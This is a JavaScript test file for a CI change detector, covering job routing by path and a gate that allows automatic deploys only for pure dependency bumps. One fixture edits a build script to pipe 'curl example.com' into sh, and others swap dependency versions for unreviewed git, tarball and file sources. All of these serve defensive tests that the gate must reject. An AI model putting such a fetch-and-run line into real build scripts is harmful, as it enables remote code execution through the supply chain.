#!/usr/bin/env node --test

/**
 * The change detector's own tests.
 *
 * A wrong rule here does not fail loudly. It produces a green pull request for
 * a job that never ran, which is the one CI failure mode nobody notices — so
 * the policy is asserted directly rather than inferred from a workflow run.
 *
 * Run with `node --test scripts` (which is what `pnpm test` does at the root).
 * Deliberately no test framework: this file has to keep working when the
 * lockfile is the thing under change.
 */

import assert from 'node:assert/strict'
import { test } from 'node:test'
import {
  classify,
  DEPENDENCY_FIELDS,
  everything,
  inspectPackageJson,
  JOBS,
  RULES,
} from './detect-changes.mjs'

/** Assert the exact set of jobs a change turns on — including the ones it must not. */
function expectJobs(files, expected) {
  const result = classify(files)
  const actual = JOBS.filter((job) => result[job])
  assert.deepEqual(
    actual,
    JOBS.filter((job) => expected.includes(job)),
    `${JSON.stringify(files)}\n  categories: ${result.categories.join(', ')}\n  unclassified: ${result.unclassified.join(', ')}`,
  )
  return result
}

test('no change runs nothing', () => {
  expectJobs([], [])
  expectJobs(['', '  '], [])
})

// ---------------------------------------------------------------------------
// Prose
// ---------------------------------------------------------------------------

test('docs-only changes run no job', () => {
  const result = expectJobs(
    ['docs/web-architecture.md', 'docs/supply-chain.md', 'README.md', 'CLAUDE.md', 'AGENTS.md'],
    [],
  )
  assert.deepEqual(result.categories, ['docs'])
  assert.deepEqual(result.unclassified, [])
})

test('a README inside a code directory is still prose', () => {
  expectJobs(['poster-renderer/README.md', 'apps/web/src/README.md'], [])
})

test('agent tooling is not part of the build', () => {
  expectJobs(['.claude/settings.json', '.claude/hooks/session-start.sh'], [])
})

// ---------------------------------------------------------------------------
// The application
// ---------------------------------------------------------------------------

test('a Web UI change runs the web job and the browser suite', () => {
  expectJobs(['apps/web/src/screens/RunsScreen.tsx'], ['web', 'e2e'])
  expectJobs(['apps/web/src/styles/app.css'], ['web', 'e2e'])
  expectJobs(['apps/web/index.html', 'apps/web/public/robots.txt'], ['web', 'e2e'])
})

test('a Worker route change runs the web job and the browser suite', () => {
  expectJobs(['apps/web/worker/routes/runs.ts'], ['web', 'e2e'])
  expectJobs(['apps/web/worker/middleware/authorize.ts'], ['web', 'e2e'])
  expectJobs(['apps/web/worker/auth/passkey-plugin.ts'], ['web', 'e2e'])
})

test('a D1 migration runs the workerd suite and the real-database E2E stack', () => {
  expectJobs(['apps/web/migrations/0004_something.sql'], ['web', 'e2e'])
  expectJobs(['apps/web/migrations/meta/_journal.json'], ['web', 'e2e'])
  expectJobs(['apps/web/drizzle.config.ts'], ['web', 'e2e'])
})

test('the Node/DOM/workerd suites do not drag in Playwright', () => {
  expectJobs(['apps/web/test/ui/run-gallery.test.ts'], ['web'])
  expectJobs(['apps/web/test/dom/sign-in.test.tsx'], ['web'])
  expectJobs(['apps/web/test/worker/runs.spec.ts'], ['web'])
  expectJobs(['apps/web/vitest.config.ts'], ['web'])
  expectJobs(['apps/web/vitest.dom.config.ts'], ['web'])
  expectJobs(['apps/web/test/worker/vitest.config.ts'], ['web'])
})

test('shared CSV fixtures reach the browser too', () => {
  expectJobs(['apps/web/test/fixtures/e2e/260811a_data.csv'], ['web', 'e2e'])
})

test('the Pages front door reaches the web job and the browser suite', () => {
  // The Function every authenticated request passes through. `pnpm typecheck`
  // in apps/web now covers it, and the E2E suite is the only thing that
  // exercises the Pages -> service-binding hop at all.
  const result = expectJobs(['apps/web/pages/functions/api/[[path]].ts'], ['web', 'e2e'])
  assert.deepEqual(result.categories, ['pages-front-door'])
  expectJobs(['apps/web/pages/tsconfig.json'], ['web', 'e2e'])
})

test('the Pages routing table is part of the deployed output', () => {
  // _routes.json is what replaces run_worker_first. Getting it wrong returns
  // index.html at 200 for every API call.
  expectJobs(['apps/web/public/_routes.json'], ['web', 'e2e'])
})

test('the E2E suite and its config run only the E2E job', () => {
  expectJobs(['apps/web/playwright.config.ts'], ['e2e'])
  expectJobs(['apps/web/e2e/specs/passkey.spec.ts'], ['e2e'])
  expectJobs(['apps/web/e2e/harness/stack.ts'], ['e2e'])
  expectJobs(['apps/web/e2e/wrangler.e2e.jsonc'], ['e2e'])
})

test('deployment shape changes run the web job and the browser suite', () => {
  expectJobs(['apps/web/wrangler.jsonc'], ['web', 'e2e'])
  expectJobs(['apps/web/vite.config.ts'], ['web', 'e2e'])
  expectJobs(['apps/web/tsconfig.json'], ['web', 'e2e'])
  expectJobs(['apps/web/package.json'], ['web', 'e2e'])
  expectJobs(['apps/web/scripts/resolve-wrangler-config.mjs'], ['web', 'e2e'])
})

test('an unrecognised file under apps/web still runs the app jobs', () => {
  const result = expectJobs(['apps/web/some-new-thing.ts'], ['web', 'e2e'])
  assert.deepEqual(result.categories, ['web-other'])
})

// ---------------------------------------------------------------------------
// Workspace packages
// ---------------------------------------------------------------------------

test('analysis-core is checked against the Python oracle', () => {
  expectJobs(['packages/analysis-core/src/numeric.ts'], ['web', 'numerical', 'e2e'])
  expectJobs(['packages/analysis-core/test/pipeline.golden.test.ts'], ['web', 'numerical', 'e2e'])
})

test('plot-spec is half of the poster visual contract', () => {
  expectJobs(['packages/plot-spec/src/presets.ts'], ['web', 'poster', 'e2e'])
  expectJobs(['packages/plot-spec/src/builder.ts'], ['web', 'poster', 'e2e'])
})

test('shared runs the application jobs', () => {
  expectJobs(['packages/shared/src/snapshot.ts'], ['web', 'e2e'])
})

test('a workspace package with no rule runs everything', () => {
  const result = expectJobs(['packages/brand-new/src/index.ts'], JOBS)
  assert.deepEqual(result.categories, ['packages-other'])
})

// ---------------------------------------------------------------------------
// The numerical oracle
// ---------------------------------------------------------------------------

test('the Python reference runs the golden job and nothing else', () => {
  expectJobs(['reference/python/core/data_processor.py'], ['numerical'])
  expectJobs(['reference/python/generate_golden.py'], ['numerical'])
  expectJobs(['reference/python/requirements.txt'], ['numerical'])
})

test('the vendored desktop version reaches every job that restates it', () => {
  // REFERENCE_VERSION.txt is the exception to the rule above, and the exception is the point: the
  // number in it is copied into the web app's about line and into the poster watermark, and the
  // checker that catches a half-finished bump (`scripts/check-versions.mjs`) runs inside the web
  // job. Routed as plain `reference/python/**` it would run `numerical` only, and the one failure
  // it exists to catch would go green.
  expectJobs(['reference/python/REFERENCE_VERSION.txt'], ['web', 'numerical', 'poster', 'e2e'])
  // The neighbouring commit pin is not restated anywhere, so it keeps the narrower routing.
  expectJobs(['reference/python/REFERENCE_COMMIT.txt'], ['numerical'])
})

test('a golden fixture is compared from both sides', () => {
  expectJobs(['tests/golden/index.json'], ['web', 'numerical'])
  expectJobs(['tests/golden/arrays/abc.f64'], ['web', 'numerical'])
})

test('a CSV fixture is read by all three consumers', () => {
  expectJobs(['tests/fixtures/csv/realistic_large.csv'], ['web', 'numerical', 'e2e'])
})

// ---------------------------------------------------------------------------
// The poster renderer
// ---------------------------------------------------------------------------

test('the poster renderer runs its own job and the integration that drives it', () => {
  expectJobs(['poster-renderer/src/poster_renderer/render.py'], ['poster', 'e2e'])
  expectJobs(['poster-renderer/tests/test_visual_contract.py'], ['poster', 'e2e'])
  expectJobs(['poster-renderer/src/poster_renderer/preset.py'], ['poster', 'e2e'])
})

test('the Dockerfile and the pinned wheels are the image the E2E stack starts', () => {
  expectJobs(['poster-renderer/Dockerfile'], ['poster', 'e2e'])
  expectJobs(['poster-renderer/requirements.txt'], ['poster', 'e2e'])
})

// ---------------------------------------------------------------------------
// Root configuration and dependencies
// ---------------------------------------------------------------------------

test('the root package.json defines every CI script, so it runs everything', () => {
  expectJobs(['package.json'], JOBS)
})

test('the npm lockfile cannot move a Python wheel', () => {
  // The weekly Renovate lockFileMaintenance pull request. It used to install
  // NumPy and build a container image to prove a JavaScript dependency bump.
  const result = expectJobs(['pnpm-lock.yaml'], ['web', 'e2e'])
  assert.deepEqual(result.categories, ['npm-lockfile'])
})

test('the workspace manifest holds the supply-chain gates', () => {
  expectJobs(['pnpm-workspace.yaml'], ['web', 'e2e'])
})

test('TypeScript and formatter configuration', () => {
  expectJobs(['tsconfig.base.json'], ['web', 'e2e'])
  expectJobs(['biome.json'], ['web'])
})

// ---------------------------------------------------------------------------
// CI configuration
// ---------------------------------------------------------------------------

test('a workflow change runs the whole matrix', () => {
  expectJobs(['.github/workflows/ci.yml'], JOBS)
  expectJobs(['.github/workflows/security.yml'], JOBS)
})

test('the deploy workflow runs the whole matrix', () => {
  // deploy.yml re-runs verification itself, but a change to it is a change to
  // what "verified" means, and this is the cheap place to notice.
  expectJobs(['.github/workflows/deploy.yml'], JOBS)
})

test('the scripts CI depends on run the whole matrix, including this detector', () => {
  expectJobs(['scripts/detect-changes.mjs'], JOBS)
  expectJobs(['scripts/detect-changes.test.mjs'], JOBS)
  expectJobs(['scripts/check-worker-bundle-size.mjs'], JOBS)
  expectJobs(['scripts/check-commit-identity.mjs'], JOBS)
  expectJobs(['.githooks/pre-commit'], JOBS)
  expectJobs(['renovate.json5'], JOBS)
  expectJobs(['.gitleaks.toml'], JOBS)
})

// ---------------------------------------------------------------------------
// The safety net
// ---------------------------------------------------------------------------

test('a path no rule matches turns everything on and says so', () => {
  const result = expectJobs(['some/unknown/place.ts'], JOBS)
  assert.deepEqual(result.unclassified, ['some/unknown/place.ts'])
  assert.ok(result.categories.includes('unclassified'))
})

test('repository metadata is deliberately unclassified rather than assumed harmless', () => {
  // .gitignore reaches biome (`useIgnoreFile`) and every glob in the repository.
  // Guessing "harmless" here would be guessing about a file whose entire job is
  // to change which files other tools see.
  expectJobs(['.gitignore'], JOBS)
})

test('a mixed change is the union, never the first match', () => {
  expectJobs(['docs/deployment.md', 'apps/web/src/app/App.tsx'], ['web', 'e2e'])
  expectJobs(['reference/python/fixtures.py', 'poster-renderer/Dockerfile'], ['numerical', 'poster', 'e2e'])
  expectJobs(
    ['docs/x.md', 'packages/analysis-core/src/numeric.ts', 'poster-renderer/src/poster_renderer/render.py'],
    JOBS,
  )
})

test('everything() is on for every job', () => {
  const result = everything('push-to-main')
  for (const job of JOBS) assert.equal(result[job], true, job)
  assert.equal(result.deps, true)
  assert.deepEqual(result.categories, ['push-to-main'])
})

// ---------------------------------------------------------------------------
// The dependency-manifest flag, consumed by .github/workflows/security.yml
// ---------------------------------------------------------------------------

test('every dependency manifest sets deps, across both ecosystems', () => {
  for (const path of [
    'pnpm-lock.yaml',
    'pnpm-workspace.yaml',
    'package.json',
    'apps/web/package.json',
    'packages/shared/package.json',
    'reference/python/requirements.txt',
    'reference/python/requirements.in',
    'poster-renderer/requirements.txt',
    'poster-renderer/Dockerfile',
    'osv-scanner.toml',
  ]) {
    assert.equal(classify([path]).deps, true, path)
  }
})

test('ordinary source and prose do not set deps', () => {
  for (const path of [
    'apps/web/src/app/App.tsx',
    'apps/web/worker/routes/runs.ts',
    'packages/analysis-core/src/numeric.ts',
    'poster-renderer/src/poster_renderer/render.py',
    'docs/supply-chain.md',
  ]) {
    assert.equal(classify([path]).deps, false, path)
  }
})

test('editing the scanner pins re-runs the scan they configure', () => {
  for (const path of ['.github/workflows/security.yml', 'scripts/detect-changes.mjs']) {
    assert.equal(classify([path]).deps, true, path)
  }
})

test('an unclassified path sets deps too — a scan that did not run found nothing', () => {
  assert.equal(classify(['some/unknown/place.ts']).deps, true)
})

// ---------------------------------------------------------------------------
// The rule table itself
// ---------------------------------------------------------------------------

test('every rule names only real jobs', () => {
  for (const rule of RULES) {
    assert.ok(rule.category.length > 0)
    assert.ok(rule.match instanceof RegExp, rule.category)
    for (const job of rule.jobs) assert.ok(JOBS.includes(job), `${rule.category} -> unknown job ${job}`)
  }
})

test('no rule is shadowed by an earlier one that routes differently', () => {
  // First match wins, so an ordering mistake silently changes the policy. This
  // catches the case where a broad rule is moved above a narrow one.
  const samples = [
    'apps/web/e2e/specs/passkey.spec.ts',
    'apps/web/test/dom/sign-in.test.tsx',
    'apps/web/src/main.tsx',
    'packages/plot-spec/src/presets.ts',
    'packages/analysis-core/src/numeric.ts',
    'poster-renderer/Dockerfile',
    'docs/deployment.md',
    'package.json',
    'pnpm-lock.yaml',
  ]
  const expected = {
    'apps/web/e2e/specs/passkey.spec.ts': 'e2e-suite',
    'apps/web/test/dom/sign-in.test.tsx': 'web-tests',
    'apps/web/src/main.tsx': 'web-ui',
    'packages/plot-spec/src/presets.ts': 'plot-spec',
    'packages/analysis-core/src/numeric.ts': 'analysis-core',
    'poster-renderer/Dockerfile': 'poster-renderer',
    'docs/deployment.md': 'docs',
    'package.json': 'root-config',
    'pnpm-lock.yaml': 'npm-lockfile',
  }
  for (const path of samples) {
    assert.deepEqual(classify([path]).categories, [expected[path]], path)
  }
})

// ---------------------------------------------------------------------------
// The automatic-deploy gate (.github/workflows/deploy.yml)
// ---------------------------------------------------------------------------

/** A manifest that looks like this repository's, with the given fields overridden. */
function manifest(overrides = {}) {
  return JSON.stringify({
    name: 'aat-web',
    private: true,
    type: 'module',
    packageManager: 'pnpm@11.19.0',
    engines: { node: '>=22' },
    scripts: { build: 'pnpm -r build', test: 'pnpm test:scripts && pnpm -r test' },
    dependencies: { hono: '4.13.0', zod: '4.4.3' },
    devDependencies: { typescript: '7.0.2' },
    ...overrides,
  })
}

/** A `readManifest` built from `{ path: [beforeText, afterText] }`. */
function reader(contents) {
  return (path) => {
    const pair = contents[path]
    assert.ok(pair !== undefined, `the detector read ${path}, which the test did not stage`)
    return { before: pair[0], after: pair[1] }
  }
}

test('a lockfile-only change is dependency-only', () => {
  // Nothing to read: the lockfile is not a manifest whose contents can say more
  // than a version, so the path rule is the whole test.
  assert.equal(classify(['pnpm-lock.yaml']).depsOnly, true)
})

test('a manifest whose dependency versions moved, and nothing else, is dependency-only', () => {
  const result = classify(['pnpm-lock.yaml', 'apps/web/package.json'], {
    readManifest: reader({
      'apps/web/package.json': [manifest(), manifest({ dependencies: { hono: '4.13.1', zod: '4.4.3' } })],
    }),
  })
  assert.equal(result.depsOnly, true)
  assert.deepEqual(result.depsOnlyRefusals, [])
})

test('every dependency field counts as a version field', () => {
  for (const field of DEPENDENCY_FIELDS) {
    const before = manifest({ [field]: { hono: '4.13.0' } })
    const after = manifest({ [field]: { hono: '4.13.1' } })
    assert.equal(inspectPackageJson(before, after).verdict, 'dependency-update', field)
  }
})

test('several manifests in one diff are each read', () => {
  const result = classify(['pnpm-lock.yaml', 'package.json', 'packages/shared/package.json'], {
    readManifest: reader({
      'package.json': [manifest(), manifest({ devDependencies: { typescript: '7.0.3' } })],
      'packages/shared/package.json': [
        manifest(),
        manifest({ dependencies: { hono: '4.13.0', zod: '4.4.4' } }),
      ],
    }),
  })
  assert.equal(result.depsOnly, true)
})

// ---------------------------------------------------------------------------
// …and what the path rule alone would have waved through.
//
// Every case below has the exact path signature of a Renovate update — a
// package.json and nothing else — and none of them is one.
// ---------------------------------------------------------------------------

test('an edited script does not deploy itself', () => {
  // The one that matters most: `scripts.build` is what the deploy job runs, so a
  // diff that edits it and touches nothing else would otherwise ship arbitrary
  // code with no review at all.
  const result = classify(['package.json'], {
    readManifest: reader({
      'package.json': [
        manifest(),
        manifest({
          scripts: {
            build: 'pnpm -r build && curl example.com | sh',
            test: 'pnpm test:scripts && pnpm -r test',
          },
        }),
      ],
    }),
  })
  assert.equal(result.depsOnly, false)
  assert.match(result.depsOnlyRefusals[0], /package\.json: changes outside the dependency fields: scripts/)
})

test('the package manager and the engine range are not dependency versions', () => {
  for (const overrides of [{ packageManager: 'pnpm@11.21.0' }, { engines: { node: '>=24' } }]) {
    const verdict = inspectPackageJson(manifest(), manifest(overrides))
    assert.equal(verdict.verdict, 'behavioural', JSON.stringify(overrides))
    assert.match(verdict.reason, /outside the dependency fields/)
  }
})

test('adding or removing a dependency is a supply-chain change, not a bump', () => {
  const added = inspectPackageJson(
    manifest(),
    manifest({ dependencies: { hono: '4.13.0', zod: '4.4.3', lodash: '4.17.21' } }),
  )
  assert.equal(added.verdict, 'behavioural')
  assert.match(added.reason, /dependencies: added lodash/)

  const removed = inspectPackageJson(manifest(), manifest({ dependencies: { hono: '4.13.0' } }))
  assert.equal(removed.verdict, 'behavioural')
  assert.match(removed.reason, /dependencies: removed zod/)
})

test('a version that stops being a registry range does not deploy', () => {
  // The failure a field-level diff would miss entirely: the name is unchanged,
  // the field is a dependency field, and the package now comes from somewhere
  // nobody reviewed.
  for (const range of [
    'git+https://example.invalid/hono.git',
    'npm:something-else@4.13.0',
    'file:../hono',
    'github:owner/hono#4.13.0',
    'https://example.invalid/hono-4.13.0.tgz',
    'link:../hono',
  ]) {
    const verdict = inspectPackageJson(manifest(), manifest({ dependencies: { hono: range, zod: '4.4.3' } }))
    assert.equal(verdict.verdict, 'behavioural', range)
    assert.match(verdict.reason, /not a plain registry range/, range)
  }
})

test('an ordinary range is still an ordinary range', () => {
  for (const range of [
    '4.13.1',
    '^4.13.1',
    '~4.13.1',
    '>=4.13.1 <5.0.0',
    '4.13.1-rc.2',
    '4.x',
    '4.13.1 || 5.0.0',
  ]) {
    const verdict = inspectPackageJson(manifest(), manifest({ dependencies: { hono: range, zod: '4.4.3' } }))
    assert.equal(verdict.verdict, 'dependency-update', range)
  }
})

test('a workspace link is left alone while it does not move', () => {
  // `workspace:*` is not a registry range and never has to be: an unchanged
  // constraint is never examined. Changing one is a different matter.
  const before = manifest({ dependencies: { '@aat/shared': 'workspace:*', hono: '4.13.0' } })
  const after = manifest({ dependencies: { '@aat/shared': 'workspace:*', hono: '4.13.1' } })
  assert.equal(inspectPackageJson(before, after).verdict, 'dependency-update')

  const repointed = manifest({ dependencies: { '@aat/shared': 'file:../elsewhere', hono: '4.13.0' } })
  assert.equal(inspectPackageJson(before, repointed).verdict, 'behavioural')
})

test('a manifest that cannot be read refuses rather than assumes', () => {
  assert.equal(inspectPackageJson(null, manifest()).verdict, 'unreadable')
  assert.equal(inspectPackageJson(manifest(), null).verdict, 'unreadable')
  assert.equal(inspectPackageJson('{ not json', manifest()).verdict, 'unreadable')
  assert.equal(inspectPackageJson('[]', manifest()).verdict, 'unreadable')
  assert.equal(inspectPackageJson(manifest({ dependencies: 'hono' }), manifest()).verdict, 'unreadable')
})

test('a new workspace package is an addition, not a bump', () => {
  const result = classify(['pnpm-lock.yaml', 'packages/brand-new/package.json'], {
    readManifest: reader({ 'packages/brand-new/package.json': [null, manifest()] }),
  })
  assert.equal(result.depsOnly, false)
  assert.match(result.depsOnlyRefusals[0], /added, deleted, or unreadable/)
})

test('a caller that cannot show the manifest does not get a deploy out of it', () => {
  // classify() is pure and the reader is injected, so "no reader" is a real
  // state — `--files-from` has no revisions to read from. It must not resolve to
  // "assume it was a version bump".
  const result = classify(['pnpm-lock.yaml', 'package.json'])
  assert.equal(result.depsOnly, false)
  assert.match(result.depsOnlyRefusals[0], /no manifest reader/)
})

test('the manifests are only read once the paths already qualify', () => {
  // A reader that throws proves the source file short-circuited the check: there
  // is no point asking what a manifest says when something else in the diff has
  // already settled it.
  const explode = () => assert.fail('the manifest was read for a diff that could never deploy')
  assert.equal(
    classify(['package.json', 'apps/web/src/app/App.tsx'], { readManifest: explode }).depsOnly,
    false,
  )
})

test('one source file is enough to stop an automatic deploy', () => {
  // The gate is all-or-nothing on purpose: a dependency bump that also edits
  // code is a code change wearing a dependency bump's clothes.
  assert.equal(classify(['pnpm-lock.yaml', 'apps/web/src/app/App.tsx']).depsOnly, false)
  assert.equal(classify(['apps/web/src/app/App.tsx']).depsOnly, false)
  assert.equal(classify(['.github/workflows/deploy.yml']).depsOnly, false)
  assert.equal(classify(['docs/deployment.md']).depsOnly, false)
})

test('the visual contract and the supply-chain policy never deploy themselves', () => {
  // Renovate never auto-merges poster-renderer updates, and pnpm-workspace.yaml
  // carries the install-time gates. Neither belongs in an unattended deploy.
  assert.equal(classify(['poster-renderer/requirements.txt']).depsOnly, false)
  assert.equal(classify(['poster-renderer/Dockerfile']).depsOnly, false)
  assert.equal(classify(['reference/python/requirements.txt']).depsOnly, false)
  assert.equal(classify(['pnpm-workspace.yaml']).depsOnly, false)
})

test('a change nobody can see does not deploy', () => {
  // An empty list means the diff could not be determined, not that nothing
  // happened. Fail towards not deploying.
  assert.equal(classify([]).depsOnly, false)
  assert.equal(classify(['', '  ']).depsOnly, false)
  assert.equal(everything('diff-unavailable').depsOnly, false)
})
